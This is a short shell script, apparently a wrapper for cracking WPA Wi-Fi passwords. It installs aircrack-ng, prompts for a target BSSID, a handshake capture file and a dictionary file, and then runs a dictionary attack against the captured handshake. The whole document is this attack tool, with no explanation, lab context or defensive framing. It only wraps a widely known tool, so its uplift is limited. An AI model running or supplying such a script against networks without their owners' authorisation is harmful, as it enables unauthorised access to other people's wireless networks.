apt install aircrack-ng
read -p 'Enter Target BSSID: ' bssid
read -p 'Enter path to cap file: ' files
read -p 'Enter path to a dictionary file: ' dict
aircrack-ng -b $bssid -a 2 -w $dict $files
